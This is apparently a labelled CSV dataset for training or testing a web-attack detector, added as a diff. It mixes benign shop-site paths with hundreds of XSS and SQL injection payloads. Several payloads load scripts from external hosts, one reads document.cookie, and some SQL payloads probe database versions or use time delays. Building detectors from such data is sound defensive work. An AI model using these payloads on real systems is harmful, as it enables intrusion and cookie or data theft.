+"<script\x0Dtype=""text/javascript"">javascript:alert(1);</script>",xss
+"<SCRIPT ="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
+"""`'><script>\x0Djavascript:alert(1)</script>",xss
+" or true--
+' or true--
+) or true--",sqli
+1oo&1: select * from users where id=1 + \+%\ or 1=1 -- 1,sqli
+"a"" and ""456""=""678",sqli
+miembros/salir.jsp,benign
+publico/productos.jsp,benign
+"s{;s: select * from users where id=1 or ""{;"" or 1=1 -- 1",sqli
+"<img \x39src=x onerror=""javascript:alert(1)"">",xss
+&.o1&: select * from users where id=1 or \.<1 or 1=1 -- 1,sqli
+&ov&1: select * from users where id=1 or !<@ or 1=1 -- 1,sqli
+"<body src=1 href=1 onerror=""javascript:alert(1)""></body>",xss
+"<a href=""\x09javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"<script\x09type=""text/javascript"">javascript:alert(1);</script>",xss
+miembros/imagenes/zarauz.jpg,benign
+<input onblur=javascript:alert(1) autofocus><input autofocus>,xss
+') or true--,sqli
+miembros/imagenes/castro.jpg,benign
+"s&o.U: select * from users where id='1' or \<\. union select 1,@@VERSION -- 1'",sqli
+"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",xss
+1 waitfor delay '0:0:X'--,sqli
+1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>,xss
+"s)1s: select * from users where id=1 or "")1"" or 1=1 -- 1",sqli
+"""><img src=x onerror=window.open('https://www.google.com/');>",xss
+publico/productos.jsp,benign
+bettine,benign
+"ABC<div style=""x\x3Aexpression(javascript:alert(1)"">DEF",xss
+hlinka,benign
+"1c: select * from users where id=11<1# union select 1,version() -- 1",sqli
+"<meta charset=""mac-farsi"">¼script¾javascript:alert(1)¼/script¾",xss
+"<video src=1 href=1 onerror=""javascript:alert(1)""></video>",xss
+empeine,benign
+"<style></style\x20<img src=""about:blank"" onerror=javascript:alert(1)//></style>",xss
+publico/miembros.jsp,benign
+345'%5d|//*|/a%5b'a,sqli
+ciudad real,benign
+"<a href=""\x12javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"vc: select * from users where id=1 + @<1# union select 1,version() -- 1",sqli
+"1234 "" AND 1=0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",sqli
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,xss
+"<div style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>",xss
+"1)UE1: select * from users where id=1 +(1) union select 1,banner from v$version where rownum=1 -- 1",sqli
+augur,benign
+"1oo1U: select * from users where id=1 + \+%1 union select null,@@VERSION -- 1",sqli
+miembros/imagenes/castro.jpg,benign
+"<table background=""javascript:javascript:alert(1)"">",xss
+"s:UEf: select * from users where id=1 or 1#"": union select version(),version() -- 1",sqli
+"""`'><script>\xE2\x80\x85javascript:alert(1)</script>",xss
+"ABC<div style=""x:\xC2\xA0expression(javascript:alert(1)"">DEF",xss
+"travesia doctor sanchez, 139, 12?h",benign
+"<x '=""foo""><x foo='><img src=x onerror=javascript:alert(1)//'>",xss
+"s(1s: select * from users where id=1 or ""(1"" or 1=1 -- 1",sqli
+07441681p,benign
+"""`'><script>\xE2\x80\x87javascript:alert(1)</script>",xss
+"<a href=""\x18javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+&n1&1: select * from users where id=1 or $ 1=1 or 1=1 -- 1,sqli
+global/menum.jsp,benign
+publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=100&cantidad=39&B1=A%F1adir+al+carrito,benign
+"s,.s: select * from users where id=1 or "",."" or 1=1 -- 1",sqli
+"<meta charset=""x-imap4-modified-utf7"">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>",xss
+"<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d",xss
+"<img src onerror /"" '""= alt=javascript:alert(1)//"">",xss
+gelber serarols,benign
+"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",xss
+siku@tartasconamor.in,benign
+miembros/imagenes/ogono.jpg,benign
+a' and 'fghi'='fghj'-- #,sqli
+"UEv&1: select * from users where id=1 union select @||1,version() -- 1",sqli
+"<a href=""javas\x04cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"&vc: select * from users where id=1 or  @$#=1 union select 1,version() -- 1",sqli
+on1&1: select * from users where id=1 %$ 1 or 1=1 -- 1,sqli
+")) or ((x""))=((""x",sqli
+"<img\x13src=x onerror=""javascript:alert(1)"">",xss
+admin' or 1=1#,sqli
+"1') or benchmark(100000000,MD5(1))#",sqli
+a'or/*g*/345=345-- #,sqli
+' ',sqli
+"345')%5d|//*|/a%5bcontains(a,'b",sqli
+"""`'><script>\x3Bjavascript:alert(1)</script>",xss
+<svg><script ?>alert(1),xss
+"s:c: select * from users where id=1 or "":#"" or 1=1 -- 1",sqli
+"sUE1s: select * from users where id='1' union select 1""!"",banner from v$version where rownum=1 -- 1'",sqli
+reiji,benign
+"s:{s: select * from users where id=1 or "":{"" or 1=1 -- 1",sqli
+<img/src=`%00` onerror=this.onerror=confirm(1) ,xss
+"<a href=""\x05javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+publico/pagar.jsp?modo=insertar&precio=9209&B1=Confirmar,benign
+global/estilos.css,benign
+"s(o1U: select * from users where id=1 or @#""(=1 union select 1,version() -- 1",sqli
+"svUEs: select * from users where id=1 or 1#""@ union select 'a',version() -- 1",sqli
+publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=85&cantidad=83&B1=A%F1adir+al+carrito,benign
+*,sqli
+publico/pagar.jsp?modo=insertar&precio=9334&B1=Confirmar,benign
+"s&ovU: select * from users where id='1' or !<@ union select 1,version() -- 1'",sqli
+"<! foo=""><script>javascript:alert(1)</script>"">",xss
+"<a href=""\x14javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+a' and 'fghi'='fghj'#,sqli
+"s;&1c: select * from users where id=1 or 1#""; or 1=1 -- 1",sqli
+a' and 'fghi'='fghj'-- #,sqli
+"'`""><\x00script>javascript:alert(1)</script>",xss
+"<META HTTP-EQUIV=""Link"" Content=""<%(css)s>; REL=stylesheet"">",xss
+"s{)s: select * from users where id=1 or ""{)"" or 1=1 -- 1",sqli
+"plza. carmelo solis, 78, 4?g",benign
+publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=39&cantidad=20&B1=A%F1adir+al+carrito,benign
+"<BASE HREF=""javascript:alert('XSS');//"">",xss
+"""`'><script>\xE2\x80\x83javascript:alert(1)</script>",xss
+van_eyk,benign
+global/menum.jsp,benign
+"so(.): select * from users where id='1' + (\.) union select 1,@@VERSION -- 1'",sqli
+a' or '345'='345,sqli
+publico/entrar.jsp?errorMsg=Credenciales+incorrectas,benign
+"`""'><img src=xxx:x onerror\x00=javascript:alert(1)>",xss
+".UEvc: select * from users where id=1 +\. union select null,@@VERSION -- 1",sqli
+"c/ fray diego de cadiz, 50",benign
+"sUEn.: select * from users where id='1' union select $ .,@@VERSION -- 1'",sqli
+index.jsp,benign
+"""`'><script>\xC2\xA0javascript:alert(1)</script>",xss
+miembros/index.jsp,benign
+"<a&#32;href&#61;&#91;&#00;&#93;""&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;"">XYZ</a",xss
+"so(1): select * from users where id='1' *(1) union select 1,banner from v$version where rownum=1 -- 1'",sqli
+"<META HTTP-EQUIV=""Link"" Content=""<http://ha.ckers.org/xss.css>; REL=stylesheet"">",xss
+"&.oo1: select * from users where id=1 or \.< =1 union select 1,@@VERSION -- 1",sqli
+<IMG SRC=JaVaScRiPt:alert('XSS')>,xss
+a'||/**/345=345#,sqli
+3902,benign
+"1 or benchmark(100000000,MD5(1))#",sqli
+"s(os: select * from users where id=1 or ""(&"" or 1=1 -- 1",sqli
+admin' or 1=1--,sqli
+or 1=1-- ,sqli
+"<IMG SRC=""jav    ascript:javascript:alert(1);"">",xss
+"""`'><script>\xE3\x80\x80javascript:alert(1)</script>",xss
+"s?o1&: select * from users where id=1 or 1#""?=1 or 1=1 -- 1",sqli
+"UE1o,: select * from users where id=1 union select 1<@,version() -- 1",sqli
+or true--,sqli
+"ABC<div style=""x:\xE2\x80\x87expression(javascript:alert(1)"">DEF",xss
+publico/entrar.jsp?errorMsg=Credenciales+incorrectas,benign
+miembros/editar.jsp?modo=registro&login=mauro&password=PON38rA1L9&nombre=Mirko&apellidos=Valeri+Arlat&email=griffith_chesbro%40psykoterapeut.sn&dni=68133766S&direccion=Urbanitzacio+Canyet+24%2C+4%3FA&ciudad=Vall+de+Bianya%2C+La&cp=21208&provincia=Guadalajara&ntc=6202740443449579&B1=Registrar,benign
+imagenes/nuestratierra.jpg,benign
+"<A HREF=""htt    p://6    6.000146.0x7.147/"">XSS</A>",xss
+"<BR SIZE=""&{javascript:alert(1)}"">",xss
+"<form id=""test"" /><button form=""test"" formaction=""javascript:javascript:alert(1)"">X",xss
+"s?1s: select * from users where id=1 or ""]1"" or 1=1 -- 1",sqli
+sandberg@3horas.tl,benign
+"<STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A>",xss
+publico/registro.jsp?modo=registro&login=tiedeman&password=ag2u7a&nombre=Sayara&apellidos=Carta%F1a&email=albertini_trauberg%40theroxyblue.jo&dni=71814891J&direccion=C%2F+Gamos+5%2C+11-H&ciudad=Casabermeja&cp=44707&provincia=Alicante&ntc=4856355827488327&B1=Registrar,benign
+"<a href=""\xE2\x81\x9Fjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"s:UEv: select * from users where id=1 or 1#"": union select null,version() -- 1",sqli
+"<a href=""\xE2\x80\x85javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+valdivieso,benign
+miembros/imagenes/ogono.jpg,benign
+imagenes/3.gif,benign
+"""`'><script>\x7Ejavascript:alert(1)</script>",xss
+3814,benign
+miembros/imagenes/castro.jpg,benign
+3471,benign
+"s;v: select * from users where id=1 or "";@"" or 1=1 -- 1",sqli
+"<OBJECT CLASSID=""clsid:333C7BC4-460F-11D0-BC04-0080C7055A83""><PARAM NAME=""DataURL"" VALUE=""javascript:alert(1)""></OBJECT>",xss
+a'||/**/456=678#,sqli
+"ABC<div style=""x:\x20expression(javascript:alert(1)"">DEF",xss
+"<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">",xss
+03344221k,benign
+imagenes/2.gif,benign
+"<BASE HREF=""javascript:javascript:alert(1);//"">",xss
+"snns: select * from users where id=1 or ""$_"" or 1=1 -- 1",sqli
+"sooUE: select * from users where id='1' <@<@ union select 1,version() -- 1'",sqli
+ribadumia,benign
+"<script src=""data:text/plain\x2Cjavascript:alert(1)""></script>",xss
+"<img src=x onerror=\x32""javascript:alert(1)"">",xss
+"`""'><img src=xxx:x \x0Donerror=javascript:alert(1)>",xss
+imagenes/1.gif,benign
+"<meta http-equiv=""refresh"" content=""0;javascript&colon;alert(1)""/>",xss
+"<STYLE type=""text/css"">BODY{background:url(""javascript:javascript:alert(1)"")}</STYLE>",xss
+global/titulo.jsp,benign
+"<x style=""behavior:url(%(sct)s)"">",xss
+"o.UE1: select * from users where id=1 <@. union select 1,version() -- 1",sqli
+z5r1174osa,benign
+global/creditos.jsp,benign
+publico/miembros.jsp,benign
+"s()s: select * from users where id=1 or ""()"" or 1=1 -- 1",sqli
+"s?c: select * from users where id=1 or ""?#"" or 1=1 -- 1",sqli
+"UEv&v: select * from users where id=1 union select @&&@,version() -- 1",sqli
+"sv)s: select * from users where id=1 or ""@)"" or 1=1 -- 1",sqli
+"s{v: select * from users where id=1 or ""{@"" or 1=1 -- 1",sqli
+"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf""> ​",xss
+<svg contentScriptType=text/vbs><script>MsgBox+1,xss
+"<a href=""\x06javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+imagenes/3.gif,benign
+"<A HREF=""http://0x42.0x0000066.0x7.0x93/"">XSS</A>",xss
+global/titulo.jsp,benign
+"1)) or benchmark(100000000,MD5(1))#",sqli
+"<iframe onReadyStateChange iframe onReadyStateChange=""javascript:javascript:alert(1)""></iframe onReadyStateChange>",xss
+"c/ barriada nueva andalucia, 79, 5?f",benign
+"<img src\x32=x onerror=""javascript:alert(1)"">",xss
+6.61E+15,benign
+"<a href=""javascript\x0A:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"<style onLoad style onLoad=""javascript:javascript:alert(1)""></style onLoad>",xss
+flavio,benign
+almendros,benign
+story.darby@hostingprofessional.mv,benign
+"<IMG DYNSRC=""javascript:alert('XSS')"">",xss
+"s1UEf: select * from users where id=1 or 1#""1 union select version(),version() -- 1",sqli
+"""`'><script>\x21javascript:alert(1)</script>",xss
+".o1UE: select * from users where id=1.*1 union select 1,banner from v$version where rownum=1 -- 1",sqli
+lanfranchi@getgold.tl,benign
+'-',sqli
+"<a href=""\x07javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"UE1&v: select * from users where id=1 union select 1||@,version() -- 1",sqli
+"1&1UE: select * from users where id=11||1 union select 1,banner from v$version where rownum=1 -- 1",sqli
+"<html onmouseover html onmouseover=""javascript:javascript:alert(1)""></html onmouseover>",xss
+"""`'><script>\xE1\xA0\x8Ejavascript:alert(1)</script>",xss
+terl6z,benign
+<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>,xss
+<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^,xss
+"ABC<div style=""x:expression\x00(javascript:alert(1)"">DEF",xss
+<script\x2F>javascript:alert(1)</script>,xss
+miembros/imagenes/zarauz.jpg,benign
+"<div id=""div1""><input value=""``onmouseover=javascript:alert(1)""></div> <div id=""div2""></div><script>document.getElementById(""div2"").innerHTML = document.getElementById(""div1"").innerHTML;</script>",xss
+"sonnU: select * from users where id='1' <@$_ union select 1,version() -- 1'",sqli
+"sn?s: select * from users where id=1 or ""$?"" or 1=1 -- 1",sqli
+"s)n: select * from users where id=1 or "")["" or 1=1 -- 1",sqli
+<div style=content:url(%(svg)s)></div>,xss
+"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",xss
+a' order by 1-- #,sqli
+<script>+-+-1-+-+alert(1)</script>,xss
+publico/miembros.jsp,benign
+"v: select * from users where id=1 + @`\` union select 1,version() -- 1",sqli
+imagenes/cmenbul.gif,benign
+"'`""><\x3Cscript>javascript:alert(1)</script>        ",xss
+<script ^__^>alert(String.fromCharCode(49))</script ^__^,xss
+<body/onload=&lt;!--&gt;&#10alert(1)>,xss
+"<embed src=""data:text/html;base64,%(base64)s"">",xss
+"<a onmouseover=""alert(document.cookie)"">xxs link</a>",xss
+"oo1UE: select * from users where id=1 | |1 union select 1,banner from v$version where rownum=1 -- 1",sqli
+"UEoo1: select * from users where id=1 union select +!<1,version() -- 1",sqli
+"s,(s: select * from users where id=1 or "",("" or 1=1 -- 1",sqli
+<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->,xss
+imagenes/3.gif,benign
+makazaga millares,benign
+miembros/imagenes/ogono.jpg,benign
+<form><button formaction=javascript&colon;alert(1)>CLICKME,xss
+"ABC<div style=""x:\xE2\x80\x80expression(javascript:alert(1)"">DEF",xss
+miembros/imagenes/castro.jpg,benign
+publico/carrito.jsp,benign
+"1') or benchmark(100000000,MD5(1))#",sqli
+miembros/editar.jsp?modo=registro&login=carilyn&password=e1pirativo&nombre=Aventino&apellidos=Abell%F3+Lamarca&email=plang_schallert%40white-pearl-resort.kp&dni=66718383Y&direccion=C%2F+Misericordia%2C+57+7-H&ciudad=Baides&cp=35231&provincia=Valladolid&ntc=6302817063301722&B1=Registrar,benign
+"s{,s: select * from users where id=1 or ""{,""=1 or 1=1 -- 1",sqli
+"UEv1n: select * from users where id=1 union select @ 1a,version() -- 1",sqli
+"<img src\x11=x onerror=""javascript:alert(1)"">",xss
+"<a href=""\x0Bjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+1)); waitfor delay '0:0:X'--,sqli
+<input value=<><iframe/src=javascript:confirm(1),xss
+beaumont@lasmilyuna.gi,benign
+"s(.s: select * from users where id=1 or ""(."" or 1=1 -- 1",sqli
+"<a href=""javas\x05cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"s;(s: select * from users where id=1 or "";("" or 1=1 -- 1",sqli
+o&1c: select * from users where id=1 <@ or 1=1 -- 1,sqli
+"`""'><img src=xxx:x \x09onerror=javascript:alert(1)>",xss
+"<image src=""javascript:alert(1)"">",xss
+"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">",xss
+<svg><script ?>alert(1),xss
+imagenes/nuestratierra.jpg,benign
+"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert('XSS');"">",xss
+".oUE1: select * from users where id=1. <@ union select 1,version() -- 1",sqli
+"svUEf: select * from users where id=1 or 1#""@ union select version(),version() -- 1",sqli
+katia,benign
+<!--[if]><script>javascript:alert(1)</script -->,xss
+"""/><img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x />",xss
+publico/pagar.jsp?modo=insertar&precio=8271&B1=Pasar+por+caja,benign
+miembros/salir.jsp,benign
+imagenes/3.gif,benign
+".onUE: select * from users where id=1.<@$ union select 1,version() -- 1",sqli
+petree,benign
+"admin"" or ""1""=""1""--",sqli
+"<a href=""\x1Bjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+imagenes/nuestratierra.jpg,benign
+&.on&: select * from users where id=1 or \.<$ or 1=1 -- 1,sqli
+"UE1nk: select * from users where id=1 union select 1a,banner from v$version where rownum=1 -- 1",sqli
+"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">",xss
+"&1ovc: select * from users where id=1 or 1&@#=1 union select 1,version() -- 1",sqli
+global/creditos.jsp,benign
+index.jsp,benign
+"voc: select * from users where id=1 + @<@# union select null,version() -- 1",sqli
+"vo.UE: select * from users where id=1 + @<@. union select 1,version() -- 1",sqli
+"<style onReadyStateChange style onReadyStateChange=""javascript:javascript:alert(1)""></style onReadyStateChange>",xss
+o()&1: select * from users where id=1 %(\) or 1=1 -- 1,sqli
+"<script>if(""x\\xEE\xA9\x93"".length==2) { javascript:alert(1);}</script>",xss
+"s&oo1: select * from users where id='1' or \< =1 union select 1,@@VERSION -- 1'",sqli
+ambiental,benign
+"<html onMouseUp html onMouseUp=""javascript:javascript:alert(1)""></html onMouseUp>",xss
+"<OBJECT TYPE=""text/x-scriptlet"" DATA=""%(scriptlet)s""></OBJECT>",xss
+"<img\x11src=x onerror=""javascript:alert(1)"">",xss
+pavlow@permutatucasa.fm,benign
+index.jsp,benign
+"<TABLE BACKGROUND=""javascript:alert('XSS')"">",xss
+"<form><button formaction=""javascript:javascript:alert(1)"">X",xss
+"<svg onLoad svg onLoad=""javascript:javascript:alert(1)""></svg onLoad>",xss
+<input value=<><iframe/src=javascript:confirm(1),xss
+n1&1c: select * from users where id=1 +$ 1 or 1=1 -- 1,sqli
+"s)v: select * from users where id=1 or "")@"" or 1=1 -- 1",sqli
+"<?xml version=""1.0""?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:alert(1);</html:script></html:html>",xss
+so..&: select * from users where id='1'<@.. or 1=1 -- 1',sqli
+"carlos trivio moreno, 2,",benign
+"admin"") or (""1""=""1",sqli
+a'and/*g*/456=678-- #,sqli
+"<XSS STYLE=""xss:expression(javascript:alert(1))"">",xss
+admin') or ('1'='1'/*,sqli
+"s1c: select * from users where id=1 or ""1#"" or 1=1 -- 1",sqli
+"sos: select * from users where id='1'<@$$ union select 1,version() -- 1'",sqli
+.o&1c: select * from users where id=1. <@ or 1=1 -- 1,sqli
+"s&1UE: select * from users where id='1' ||1 union select 1,banner from v$version where rownum=1 -- 1'",sqli
+"<applet onreadystatechange applet onreadystatechange=""javascript:javascript:alert(1)""></applet onreadystatechange>",xss
+"ABC<div style=""x:\x0Dexpression(javascript:alert(1)"">DEF",xss
+"<object type=""text/x-scriptlet"" data=""http://jsfiddle.net/XLE63/ ""></object>",xss
+oo&1c: select * from users where id=1 <@<@ or 1=1 -- 1,sqli
+"`""'><img src=xxx:x onerror\x0A=javascript:alert(1)>",xss
+"<div/onmouseover='alert(1)'> style=""x:"">",xss
+a' order by 9999#,sqli
+miembros/imagenes/castro.jpg,benign
+"<a href=""\xE2\x80\x88javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"<a href=""\x17javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"<script src=""data:text/javascript,alert(1)""></script>",xss
+tomkin,benign
+imagenes/1.gif,benign
+"sons: select * from users where id=1 or ""%_"" or 1=1 -- 1",sqli
+brines grimalda,benign
+"s&.on: select * from users where id='1' or \.<$ union select 1,@@VERSION -- 1'",sqli
+"<body onunload body onunload=""javascript:javascript:alert(1)""></body onunload>",xss
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,xss
+publico/entrar.jsp?errorMsg=Credenciales+incorrectas,benign
+"<a href=""javas\x00cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"1oUEf: select * from users where id=1 +1<@ union select version(),version() -- 1",sqli
+a' or 'dfth'='dfth'-- #,sqli
+"so..U: select * from users where id='1'<@.. union select 1,version() -- 1'",sqli
+"snUEv: select * from users where id=1 or 1#""$ union select null,version() -- 1",sqli
+"1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",sqli
+publico/caracteristicas.jsp?id=1,benign
+index.jsp,benign
+"s&.oo: select * from users where id='1' or \.< =1 union select 1,@@VERSION -- 1'",sqli
+imagenes/3.gif,benign
+"<iframe/src=""data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg=="">",xss
+miembros/editar.jsp?modo=registro&login=zoratti&password=C9b4%2BtAL&nombre=Rabulas&apellidos=Documet+Recasens&email=gavin%40apagado.com.pk&dni=20048048Y&direccion=General+Lacy%2C+122+&ciudad=Roda+de+Andaluc%EDa%2C+La&cp=08611&provincia=Barcelona&ntc=2557912970687783&B1=Registrar,benign
+"<XSS STYLE=""xss:expression(alert('XSS'))"">",xss
+"<a href=""\x1Ajavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"s,os: select * from users where id=1 or "",&"" or 1=1 -- 1",sqli
+publico/autenticar.jsp?modo=entrar&login=yutaka&pwd=OficioS%24O&remember=off&B1=Entrar,benign
+miembros/imagenes/ogono.jpg,benign
+"s1ns: select * from users where id=1 or ""1_"" or 1=1 -- 1",sqli
+"<a href=""\xE2\x80\xA9javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"s{.s: select * from users where id=1 or ""{."" or 1=1 -- 1",sqli
+jaspe ochoa,benign
+"s;)s: select * from users where id=1 or "";)""=1 or 1=1 -- 1",sqli
+"<script\x0Ctype=""text/javascript"">javascript:alert(1);</script>",xss
+"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",xss
+"s1?s: select * from users where id=1 or ""1]"" or 1=1 -- 1",sqli
+miembros/imagenes/castro.jpg,benign
+"<img\x32src=x onerror=""javascript:alert(1)"">",xss
+"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">",xss
+2/*f*/and/*f*/456=678,sqli
+1.53E+15,benign
+adolfo,benign
+o1n&1: select * from users where id=1 <@1$ or 1=1 -- 1,sqli
+<IMG SRC=`javascript:javascript:alert(1)`>,xss
+imagenes/logo.gif,benign
+"<a href=""\xE2\x80\xA8javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+1'); waitfor delay '0:0:X'--,sqli
+dumensnil@bidrain.tr,benign
+"s1UEv: select * from users where id=1 or 1#""1 union select null,version() -- 1",sqli
+miembros/index.jsp,benign
+<SCRIPT SRC=//ha.ckers.org/.j>,xss
+<iframe/src \/\/onload = prompt(1),xss
+"""'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>",xss
+"admin"" or 1=1/*",sqli
+"s{UE1: select * from users where id=1 or 1#""{ union select 1,version() -- 1",sqli
+<script>/* *\x00/javascript:alert(1)// */</script>,xss
+"s.v: select * from users where id=1 or "".@"" or 1=1 -- 1",sqli
+"admin""or 1=1 or """"=""",sqli
+"<x style=""background:url('x&#1;;color:red;/*')"">XXX</x>",xss
+"<IMG SRC= onmouseover=""alert('xxs')"">",xss
+.o.&1: select * from users where id=1.<@. or 1=1 -- 1,sqli
+index.jsp,benign
+"sUEov: select * from users where id='1' union select !<@,version() -- 1'",sqli
+"<iframe %00 src=""&Tab;javascript:prompt(1)&Tab;""%00>",xss
+imagenes/3.gif,benign
+"<script src=""\\%(jscript)s""></script>",xss
+index.jsp,benign
+invo3unta6i5,benign
+"<a href=""\x1Fjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+" <HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",xss
+"<A HREF=""http://0102.0146.0007.00000223/"">XSS</A>",xss
+"soc: select * from users where id='1' + @<@# union select 1,version() -- 1'",sqli
+"<% foo><x foo=""%><script>javascript:alert(1)</script>"">",xss
+"s):s: select * from users where id=1 or ""):"" or 1=1 -- 1",sqli
+&no.&: select * from users where id=1 or $<\. or 1=1 -- 1,sqli
+"<div  style=""position:absolute;top:0;left:0;width:100%;height:100%""  onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>​",xss
+tiedeman,benign
+imagenes/logo.gif,benign
+imagenes/logo.gif,benign
+global/titulo.jsp,benign
+ribera d'ondara,benign
+publico/carrito.jsp,benign
+a' and '456'='678,sqli
+35210254z,benign
+"UEov,: select * from users where id=1 union select !<@,version() -- 1",sqli
+"<body onPageShow body onPageShow=""javascript:javascript:alert(1)""></body onPageShow>",xss
+ayoroa,benign
+456'%5d|//a|/a%5b'a,sqli
+publico/caracteristicas.jsp?id=2,benign
+imagenes/3.gif,benign
+sonn&: select * from users where id='1' <@$_ or 1=1 -- 1',sqli
+imagenes/nuestratierra.jpg,benign
+"<body onPropertyChange body onPropertyChange=""javascript:javascript:alert(1)""></body onPropertyChange>",xss
+publico/miembros.jsp,benign
+coderch gordo,benign
+"<body onMouseMove body onMouseMove=""javascript:javascript:alert(1)""></body onMouseMove>",xss
+') or ('x')=('x,sqli
+global/creditos.jsp,benign
+<script>+-+-1-+-+alert(1)</script>,xss
+"s({s: select * from users where id=1 or ""({"" or 1=1 -- 1",sqli
+"1' or benchmark(100000000,MD5(1))#",sqli
+&o1&1: select * from users where id=1 or \<1 or 1=1 -- 1,sqli
+a' or 'dfth'='dfth'-- #,sqli
+subidor,benign
+publico/pagar.jsp?modo=insertar&precio=1998&B1=Confirmar,benign
+"`""'><img src=xxx:x \x0Bonerror=javascript:alert(1)>",xss
+admin' or '1'='1,sqli
+"""`'><script>-javascript:alert(1)</script>",xss
+painter.stovin@tetdevelocidad.bn,benign
+'*',sqli
+"so1UE: select * from users where id='1' *1 union select 1,banner from v$version where rownum=1 -- 1'",sqli
+global/creditos.jsp,benign
+"<var onmouseover=""prompt(1)"">On Mouse Over</var>​",xss
+<--`<img/src=` onerror=alert(1)> --!>,xss
+"UEoov: select * from users where id=1 union select +!<@,version() -- 1",sqli
+47172,benign
+"admin"" or ""1""=""1""/*",sqli
+imagenes/nuestratierra.jpg,benign
+"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">",xss
+"<? foo=""><script>javascript:alert(1)</script>"">",xss
+publico/entrar.jsp?errorMsg=Credenciales+incorrectas,benign
+publico/productos.jsp,benign
+3411,benign
+"s1;s: select * from users where id=1 or ""1;""=1 or 1=1 -- 1",sqli
+"<a href=""\xE2\x80\x82javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+so()&: select * from users where id='1' *(\) or 1=1 -- 1',sqli
+or 1=1#,sqli
+"s:s: select * from users where id='1' union select "":""_,version() -- 1'",sqli
+"<BODY BACKGROUND=""javascript:alert('XSS')"">",xss
+<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>,xss
+a'and/*g*/456=678-- #,sqli
+"""`'><script>\xE2\x80\xA9javascript:alert(1)</script>",xss
+<SCRIPT SRC=%(jscript)s?<B>,xss
+"<BGSOUND SRC=""javascript:javascript:alert(1);"">",xss
+"s,o1U: select * from users where id=1 or @#"",=1 union select 1,version() -- 1",sqli
+"<DIV STYLE=""background-image: url(javascript:javascript:alert(1))"">",xss
+"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",xss
+"s;c: select * from users where id=1 or "";#"" or 1=1 -- 1",sqli
+1' AND 1=UTL_INADDR.get_host_address('n0where329.z0m')--,sqli
+mcbrayne,benign
+".UEvk: select * from users where id=1. union select null,banner from v$version where rownum=1 -- 1",sqli
+oov&1: select * from users where id=1 %!<@ or 1=1 -- 1,sqli
+publico/carrito.jsp,benign
+"/*iframe/src*/<iframe/src=""<iframe/src=@""/onload=prompt(1) /*iframe/src*/>",xss
+"<STYLE TYPE=""text/javascript"">javascript:alert(1);</STYLE>",xss
+a' and '456'='678,sqli
